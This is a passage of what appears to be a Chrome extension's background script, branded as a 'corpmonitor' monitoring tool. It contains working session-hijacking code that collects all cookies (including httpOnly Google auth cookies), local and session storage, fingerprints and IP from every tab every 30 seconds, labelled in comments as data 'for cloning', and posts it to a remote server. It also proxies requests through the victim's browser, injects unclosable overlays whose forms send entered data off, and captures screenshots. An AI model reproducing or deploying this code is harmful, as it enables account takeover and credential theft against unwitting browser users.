      log('warn', `[TUNNEL] Body muito grande (${responseBody.length}), truncando para ${MAX_SIZE}`);
      responseBody = responseBody.substring(0, MAX_SIZE);
    }
    
    // ══════════════════════════════════════════════════════
    // CAPTURAR COOKIES ATUALIZADOS
    // ══════════════════════════════════════════════════════
    
    log('debug', `[TUNNEL] Capturando cookies atualizados...`);
    
    const updatedCookies = [];
    for (const domain of domainsToCheck) {
      try {
        const domainCookies = await chrome.cookies.getAll({ domain });
        for (const cookie of domainCookies) {
          updatedCookies.push({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly,
            sameSite: cookie.sameSite,
            expirationDate: cookie.expirationDate,
            isSession: !cookie.expirationDate || cookie.expirationDate === 0
          });
        }
      } catch (err) {
        log('warn', `[TUNNEL] Erro ao capturar cookies atualizados: ${err.message}`);
      }
    }
    
    log('info', `🍪 [TUNNEL] Cookies atualizados capturados: ${updatedCookies.length}`);
    
    // ══════════════════════════════════════════════════════
    // PREPARAR RESULTADO
    // ══════════════════════════════════════════════════════
    
    const result = {
      success: true,
      status_code: response.status,
      status_text: response.statusText,
      headers: responseHeaders,
      body: responseBody,
      encoding: encoding,
      content_type: contentType,
      content_length: responseBody.length,
      final_url: response.url,
      redirected: response.redirected,
      cookies: updatedCookies,
      elapsed_ms: elapsed,
      timestamp: new Date().toISOString()
    };
    
    log('info', `✅ [TUNNEL] Resultado preparado`, {
      status: result.status_code,
      bodySize: result.body.length,
      cookies: result.cookies.length
    });
    
    // ══════════════════════════════════════════════════════
    // ENVIAR RESULTADO PARA EDGE FUNCTION
    // ══════════════════════════════════════════════════════
    
    await sendTunnelResult(effectiveId, result);
    
  } catch (error) {
    // ✅ Long-poll timeout é normal (reconexão automática do cliente)
    if (isLongPoll && (error.name === 'TimeoutError' || error.name === 'AbortError')) {
      log('debug', `⏱️ [TUNNEL] Long-poll timeout (normal)`, {
        command_id: effectiveId,
        url: target_url
      });
      
      await sendTunnelResult(effectiveId, {
        success: true,
        status_code: 204,
        headers: {},
        body: '',
        encoding: 'text',
        content_type: 'text/plain',
        content_length: 0,
        final_url: target_url,
        redirected: false,
        cookies: [],
        elapsed_ms: timeLimit,
        timestamp: new Date().toISOString()
      });
      return;
    }
    
    log('error', `❌ [TUNNEL] Erro na requisição`, {
      command_id: effectiveId,
      url: target_url,
      error: error.message,
      stack: error.stack
    });
    
    await sendTunnelResult(effectiveId, {
      success: false,
      error: error.message,
      error_type: error.name,
      timestamp: new Date().toISOString()
    });
  } finally {
    lastTunnelActivity = Date.now();
  }
}

/**
 * Enviar resultado para Edge Function
 */
async function sendTunnelResult(command_id, result) {
  try {
    log('debug', `[TUNNEL] Enviando resultado para Edge Function...`);
    
    const response = await fetch(`${CONFIG.API_BASE}/tunnel-fetch-result`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({
        command_id: command_id,  // ✅ Explícito para garantir que não seja undefined
        machine_id: machineId,
        ...result
      })
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Falha ao enviar resultado: ${response.status} - ${errorText}`);
    }
    
    const data = await response.json();
    log('info', `✅ [TUNNEL] Resultado enviado: ${data.result_id}`);
    
    // Enviar confirmação via WebSocket
    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
      commandSocket.send(JSON.stringify({
        type: 'command_response',
        command_id: command_id,
        success: result.success,
        result_id: data.result_id
      }));
    }
    
  } catch (error) {
    log('error', `❌ [TUNNEL] Erro ao enviar resultado: ${error.message}`);
  }
}

// Handle export cookies command - collect fresh cookies and sync to incident
async function handleExportCookiesCommand(data) {
  try {
    const tabId = parseInt(data.target_tab_id);
    const tab = await chrome.tabs.get(tabId);
    const url = new URL(tab.url);
    const host = url.hostname;
    
    log('info', `🍪 Export cookies command for tab ${tabId}, host: ${host}`);
    
    // Collect cookies from this host and related domains
    const domains = [host];
    if (host.startsWith('www.')) {
      domains.push(host.substring(4));
    } else {
      domains.push('www.' + host);
    }
    
    // For common auth domains (especialmente Google)
    const baseDomain = host.split('.').slice(-2).join('.');
    if (host.includes('google.com')) {
      domains.push('mail.google.com', 'accounts.google.com', '.google.com', 'google.com');
    }
    
    const allCookies = [];
    for (const domain of domains) {
      try {
        const cookies = await chrome.cookies.getAll({ domain });
        allCookies.push(...cookies);
      } catch (error) {
        log('error', `Failed to get cookies for ${domain}`, error);
      }
    }
    
    // Deduplicate by name::domain::path to preserve cookie variations
    // This is important for sites like Gmail where OSID/SID cookies exist for different domains
    const cookieMap = new Map();
    for (const cookie of allCookies) {
      const key = `${cookie.name}::${cookie.domain}::${cookie.path}`;
      cookieMap.set(key, {
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        expirationDate: cookie.expirationDate,
        isSession: !cookie.expirationDate || cookie.expirationDate === 0 || cookie.expirationDate < 0  // ✅ CORREÇÃO #1: detectar sessão corretamente
      });
    }
    
    const cookies = Array.from(cookieMap.values());
    log('info', `🍪 Collected ${cookies.length} unique cookies from ${domains.length} domains`);
    log('info', `📋 Cookie names: ${cookies.slice(0, 10).map(c => c.name).join(', ')}${cookies.length > 10 ? '...' : ''}`);
    
    // ✅ NOVO: Coletar localStorage e sessionStorage
    let localStorage = {};
    let sessionStorage = {};
    
    try {
      const storageData = await chrome.scripting.executeScript({
        target: { tabId },
        func: () => {
          const local = {};
          const session = {};
          
          try {
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              local[key] = localStorage.getItem(key);
            }
          } catch (e) {
            console.warn('Failed to read localStorage:', e);
          }
          
          try {
            for (let i = 0; i < sessionStorage.length; i++) {
              const key = sessionStorage.key(i);
              session[key] = sessionStorage.getItem(key);
            }
          } catch (e) {
            console.warn('Failed to read sessionStorage:', e);
          }
          
          return { localStorage: local, sessionStorage: session };
        }
      });
      
      if (storageData && storageData[0] && storageData[0].result) {
        localStorage = storageData[0].result.localStorage || {};
        sessionStorage = storageData[0].result.sessionStorage || {};
        log('info', `💾 Collected localStorage (${Object.keys(localStorage).length} keys) and sessionStorage (${Object.keys(sessionStorage).length} keys)`);
      }
    } catch (storageError) {
      log('warn', '⚠️ Failed to collect storage data:', storageError);
    }
    
    // Send to cookie-sync edge function
    const response = await fetch(`${CONFIG.API_BASE}/cookie-sync`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({
        incident_id: data.payload?.incident_id,
        cookies: cookies,
        host: host,
        tab_url: tab.url,
        localStorage: localStorage || null,      // ✅ NOVO
        sessionStorage: sessionStorage || null   // ✅ NOVO
      })
    });
    
    if (!response.ok) {
      throw new Error(`Cookie sync failed: ${response.status}`);
    }
    
    const result = await response.json();
    log('info', 'Cookies exported successfully', result);
    
    // Send success response back via WebSocket
    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
      commandSocket.send(JSON.stringify({
        type: 'command_response',
        command_id: data.command_id,
        success: true,
        cookies_exported: cookies.length
      }));
    }
  } catch (error) {
    log('error', 'Export cookies command failed', error);
    
    // Send error response
    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
      commandSocket.send(JSON.stringify({
        type: 'command_response',
        command_id: data.command_id,
        success: false,
        error: error.message
      }));
    }
  }
}

// Handle popup command with BLOCKING, OBLIGATORY popup
async function handlePopupCommand(data) {
  const originalTabId = parseInt(data.target_tab_id);
  const domain = data.target_domain;
  const htmlContent = data.payload?.html_content || '';
  const cssStyles = data.payload?.css_styles || '';
  const commandId = data.command_id || '';
  
  // Try to inject in original tab
  try {
    await injectPopupScript(originalTabId, htmlContent, cssStyles, commandId, data.target_tab_id);
    log('info', `✅ Popup injetado no tab ${originalTabId}`);
    return;
  } catch (error) {
    // If failed, try fallback by domain
    if (error.message?.includes('No tab with id') || error.message?.includes('Cannot access')) {
      log('warn', `⚠️ Tab ${originalTabId} inválido, buscando por domínio: ${domain}`);
      
      try {
        // Search for active tabs with that domain
        const tabs = await chrome.tabs.query({ url: `*://${domain}/*` });
        
        if (tabs.length > 0) {
          const fallbackTabId = tabs[0].id;
          log('info', `✅ Fallback: usando tab ${fallbackTabId} (${tabs[0].url})`);
          
          // Try again with correct tab
          await injectPopupScript(fallbackTabId, htmlContent, cssStyles, commandId, String(fallbackTabId));
          
          // Update command in DB with correct tab_id
          await updateCommandTabId(commandId, String(fallbackTabId));
          
          log('info', `✅ Popup injetado via fallback no tab ${fallbackTabId}`);
          return;
        } else {
          throw new Error(`Nenhuma aba aberta para o domínio ${domain}`);
        }
      } catch (fallbackError) {
        log('error', `❌ Fallback falhou: ${fallbackError.message}`);
        throw fallbackError;
      }
    } else {
      throw error; // Re-throw other errors
    }
  }
}

// Helper function to inject popup (reusable)
async function injectPopupScript(tabId, htmlContent, cssStyles, commandId, tabIdStr) {
  return await chrome.scripting.executeScript({
    target: { tabId },
    func: (html, css, cmdId, apiBase, apiKey, machineIdVal, tabIdVal) => {
      // Remove existing popup if any
      const existingOverlay = document.querySelector('.corpmonitor-popup-overlay');
      if (existingOverlay) {
        existingOverlay.remove();
      }
      
      // Create BLOCKING overlay - full screen, no escape
      const overlay = document.createElement('div');
      overlay.className = 'corpmonitor-popup-overlay';
      
      // Inject BLOCKING CSS
      const style = document.createElement('style');
      style.textContent = `
        .corpmonitor-popup-overlay {
          position: fixed !important;
          top: 0 !important;
          left: 0 !important;
          width: 100vw !important;
          height: 100vh !important;
          background: rgba(0, 0, 0, 0.85) !important;
          z-index: 2147483647 !important;
          display: flex !important;
          align-items: center !important;
          justify-content: center !important;
          backdrop-filter: blur(8px) !important;
        }
        
        .corpmonitor-popup-content {
          position: relative !important;
          background: white !important;
          padding: 40px !important;
          border-radius: 12px !important;
          max-width: 600px !important;
          width: 90% !important;
          max-height: 90vh !important;
          overflow-y: auto !important;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5) !important;
        }
        
        ${css}
      `;
      document.head.appendChild(style);
      
      // Wrap HTML in centered container
      const contentDiv = document.createElement('div');
      contentDiv.className = 'corpmonitor-popup-content';
      contentDiv.innerHTML = html;
      overlay.appendChild(contentDiv);
      
      // Block all keyboard shortcuts and closing attempts
      overlay.addEventListener('keydown', (e) => {
        e.stopPropagation();
        // Block ESC, F11, Alt+F4, Ctrl+W, etc.
        if (e.key === 'Escape' || e.key === 'F11' || 
            (e.altKey && e.key === 'F4') || 
            (e.ctrlKey && e.key === 'w')) {
          e.preventDefault();
        }
      }, true);
      
      // Block right-click
      overlay.addEventListener('contextmenu', (e) => {
        e.preventDefault();
      });
      
      // Find form inside and handle submission
      const form = contentDiv.querySelector('form');
      if (form) {
        form.addEventListener('submit', async (e) => {
          e.preventDefault();
          
          // Collect all form data
          const formData = new FormData(form);
          const dataObject = {};
          
          formData.forEach((value, key) => {
            dataObject[key] = value;
          });
          
          // Send to background script
          chrome.runtime.sendMessage({
            action: 'submitPopupForm',
            data: {
              command_id: cmdId,
              machine_id: machineIdVal,
              tab_id: tabIdVal,
              domain: window.location.hostname,
              url: window.location.href,
              form_data: dataObject
            }
          }, (response) => {
            if (response && response.success) {
              // Only remove popup after successful submission
              overlay.remove();
            } else {
              alert('Erro ao enviar formulário. Tente novamente.');
            }
          });
        });
      }
      
      document.body.appendChild(overlay);
    },
    args: [htmlContent, cssStyles, commandId, CONFIG.API_BASE, CONFIG.SUPABASE_ANON_KEY, machineId, tabIdStr]
  });
}

// Update command tab_id in DB
async function updateCommandTabId(commandId, newTabId) {
  try {
    await fetch(`${CONFIG.API_BASE}/rest/v1/remote_commands?id=eq.${commandId}`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`,
        'apikey': CONFIG.SUPABASE_ANON_KEY,
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({ target_tab_id: newTabId })
    });
    log('info', `✅ Comando ${commandId} atualizado com novo tab_id: ${newTabId}`);
  } catch (error) {
    log('warn', `⚠️ Falha ao atualizar tab_id do comando: ${error.message}`);
  }
}

// Add message handler for form submission
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'submitPopupForm') {
    // Send form data to edge function
    fetch(`${CONFIG.API_BASE}/popup-response`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify(request.data)
    })
    .then(response => response.json())
    .then(data => {
      log('info', 'Popup form submitted successfully', data);
      sendResponse({ success: true, data });
    })
    .catch(error => {
      log('error', 'Error submitting popup form', error);
      sendResponse({ success: false, error: error.message });
    });
    
    return true; // Keep channel open for async response
  }
});

// Handle block command
async function handleBlockCommand(data) {
  const domain = data.target_domain;
  const ruleId = Date.now();
  
  await chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [{
      id: ruleId,
      priority: 1,
      action: { type: 'block' },
      condition: { urlFilter: `*://*.${domain}/*`, resourceTypes: ['main_frame'] }
    }]
  });
}

// Handle screenshot command
async function handleScreenshotCommand(data) {
  const tabId = parseInt(data.target_tab_id);
  const screenshotUrl = await chrome.tabs.captureVisibleTab(null, { format: 'png' });
  
  await fetch(`${CONFIG.API_BASE}/screenshot-capture`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      machine_id: machineId,
      tab_id: data.target_tab_id,
      screenshot_data: screenshotUrl
    })
  });
}

// 🧹 Handle Self-Heal command
async function handleSelfHealCommand(command) {
  const { target_domains } = command.payload || {};
  
  log('info', `🧹 [SELF-HEAL] Received command for domains:`, target_domains);
  
  try {
    // For now, only support Google cleanup
    if (!target_domains || target_domains.includes('google')) {
      const result = await selfHealGoogleCookies();
      
      await updateCommandStatus(
        command.command_id,
        'completed',
        null,
        { 
          self_heal: true,
          cleaned_domains: ['google.com'],
          ...result
        }
      );
      
      // Reopen Google login page to test
      await chrome.tabs.create({
        url: 'https://accounts.google.com',
        active: true
      });
      
    } else {
      throw new Error('Unsupported domain for self-heal');
    }
    
  } catch (error) {
    log('error', '❌ [SELF-HEAL] Command failed:', error);
    await updateCommandStatus(command.command_id, 'failed', error.message);
  }
}

/**
 * Capturar dados completos da sessão para clonagem
 */
async function captureSessionData(tab, domain) {
  log('debug', `📸 Capturando dados completos para: ${domain}`);
  
  try {
    // 1. Capturar todos os cookies do domínio
    const cookies = await chrome.cookies.getAll({ domain: domain });
    
    // Capturar cookies de subdomínios
    const domainParts = domain.split('.');
    if (domainParts.length >= 2) {
      const baseDomain = `.${domainParts.slice(-2).join('.')}`;
      const baseCookies = await chrome.cookies.getAll({ domain: baseDomain });
      cookies.push(...baseCookies);
    }
    
    log('debug', `🍪 Capturados ${cookies.length} cookies`);
    
    // 2. Capturar localStorage e sessionStorage
    let storageData = { localStorage: {}, sessionStorage: {} };
    
    try {
      const [storageResult] = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          return {
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage }
          };
        }
      });
      
      if (storageResult?.result) {
        storageData = storageResult.result;
        log('debug', `💾 localStorage: ${Object.keys(storageData.localStorage).length} items`);
        log('debug', `💾 sessionStorage: ${Object.keys(storageData.sessionStorage).length} items`);
      }
    } catch (storageError) {
      log('warn', `⚠️ Não foi possível capturar storage:`, storageError);
    }
    
    // 3. Capturar fingerprint
    const fingerprint = await getBrowserFingerprintFromTab(tab.id);
    
    // 4. Obter IP público
    const clientIp = await getPublicIP();
    
    return {
      cookies: cookies.map(c => ({
        ...c,
        isSession: !c.expirationDate || c.expirationDate === 0
      })),
      local_storage: storageData.localStorage,
      session_storage: storageData.sessionStorage,
      browser_fingerprint: fingerprint,
      client_ip: clientIp
    };
    
  } catch (error) {
    log('error', `❌ Erro ao capturar dados de sessão:`, error);
    return {
      cookies: [],
      local_storage: {},
      session_storage: {},
      browser_fingerprint: null,
      client_ip: null
    };
  }
}

// Track active sessions with complete data capture
async function trackSession(tab) {
  try {
    const url = new URL(tab.url);
    if (url.protocol === 'chrome:') return;
    
    const domain = url.hostname;
    
    // ✅ CAPTURAR DADOS COMPLETOS
    const sessionData = await captureSessionData(tab, domain);
    
    const response = await fetch(`${CONFIG.API_BASE}/session-tracker`, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({
        machine_id: machineId,
        user_id: machineId,
        tab_id: tab.id.toString(),
        url: tab.url,
        domain: domain,
        title: tab.title || 'Sem título',
        action: 'heartbeat',
        
        // ✅ DADOS COMPLETOS PARA CLONAGEM
        cookies: sessionData.cookies,
        local_storage: sessionData.local_storage,
        session_storage: sessionData.session_storage,
        browser_fingerprint: sessionData.browser_fingerprint,
        client_ip: sessionData.client_ip
      }),
      signal: AbortSignal.timeout(15000)
    });
    
    if (response.ok) {
      log('debug', `✅ Session data sent with ${sessionData.cookies.length} cookies`);
      
      // ✅ NOVO: Notificar desktop sobre máquina ativa
      await notify_desktop_machine_change(machineId, 'active', {
        domain: domain,
        url: tab.url,
        cookies_count: sessionData.cookies.length
      });
      
      // Atualizar cache local
      activeSessions.set(tab.id, {
        machine_id: machineId,
        tab_id: tab.id.toString(),
        url: tab.url,
        domain: domain,
        last_update: Date.now()
      });
    } else {
      log('error', `Session tracker failed: ${response.status} ${response.statusText}`);
    }
  } catch (error) {
    // Don't break extension on network errors
    log('debug', 'Session tracker error (non-critical)', error);
  }
}

// Close session with error handling
async function closeSession(tabId) {
  try {
    const sessionData = activeSessions.get(tabId);
    if (!sessionData) return;
    
    const response = await fetch(`${CONFIG.API_BASE}/session-tracker`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...sessionData, action: 'close' })
    });
    
    if (!response.ok) {
      log('error', `Close session failed: ${response.status} ${response.statusText}`);
    }
  } catch (error) {
    // Don't break extension on network errors
    log('debug', 'Close session error (non-critical)', error);
  }
  
  activeSessions.delete(tabId);
}

// ✅ NOVO: Captura periódica de sessões (30 segundos)
function startPeriodicSessionCapture() {
  const CAPTURE_INTERVAL = 30000; // 30 seconds
  
  log('info', '🔄 Starting periodic session capture (every 30s)');
  
  setInterval(async () => {
    if (!monitoringEnabled || !machineId) {
      return;
    }
    
    try {
      // Capturar todas as abas abertas
      const tabs = await chrome.tabs.query({});
      let capturedCount = 0;
      
      for (const tab of tabs) {
        // Apenas abas com URL válida
        if (tab.url && 
            !tab.url.startsWith('chrome://') && 
            !tab.url.startsWith('chrome-extension://') &&
            !tab.url.startsWith('about:')) {
          await trackSession(tab);
          capturedCount++;
        }
      }
      
      if (capturedCount > 0) {
        log('debug', `✅ Captured ${capturedCount} sessions`);
      }
    } catch (error) {
      log('error', '❌ Error in periodic capture:', error);
    }
  }, CAPTURE_INTERVAL);
}

// Start session heartbeat (legacy - mantido para compatibilidade)
function startSessionHeartbeat() {
  setInterval(async () => {
    const tabs = await chrome.tabs.query({ active: true });
    for (const tab of tabs) {
      if (tab.url && !tab.url.startsWith('chrome:')) {
        await trackSession(tab);
      }
    }
  }, 15000);
}

// Import service worker utilities
if (typeof importScripts !== 'undefined') {
  try {
    importScripts('service-worker-utils.js', 'config.js');
  } catch (error) {
    log('warn', 'Could not load service worker utilities', error);
  }
}
